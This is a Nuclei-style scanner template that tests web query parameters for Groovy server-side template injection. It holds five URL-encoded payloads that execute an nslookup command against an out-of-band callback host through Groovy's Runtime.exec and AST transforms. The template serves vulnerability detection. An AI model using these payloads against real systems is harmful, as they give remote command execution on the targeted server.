http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: single
    part: query
    type: postfix
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol,'dns')
    - contains(interactsh_request,'srv')
    name: request-matcher
    type: dsl
  payloads:
    injection:
    - '%24%7Brce%3D%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22%3Brce.execute%28%29.text%7D'
    - '%24%7B%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22.exec()%7D'
    - '%24%7Bnew%20org.codehaus.groovy.runtime.MethodClosure(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22%2C%22execute%22).call()%7D'
    - '%24%7B%20%40ASTTest(value%3D%7Bassert%20java.lang.Runtime.getRuntime().exec(%22nslookup%20-type%3DSRV%20{{interactsh-url}}%22)%7D)%20def%20x%20%7D'
    - '%24%7B%20new%20groovy.lang.GroovyClassLoader().parseClass(%22%40groovy.transform.ASTTest(value%3D%7Bassert%20java.lang.Runtime.getRuntime().exec(%5C%22nslookup%20-type%3DSRV%20{{interactsh-url}}%5C%22)%7D)def%20x%22)%20%7D'
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
id: groovy-oob
info:
  author: 0xAwali,DhiyaneshDK,ritikchaddha
  description: 'Apache Groovy is a dynamic language with optional static type checking.
    It is similar to languages like Python, Ruby, Perl, and Smalltalk. It can be used
    as a scripting language for the Java platform.

    '
  metadata:
    verified: true
  name: Groovy - Out of Band Template Injection
  reference:
  - https://docs.groovy-lang.org/
  - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#groovy---command-execution
  severity: high
  tags: ssti,dast,oast,oob,groovy,vuln
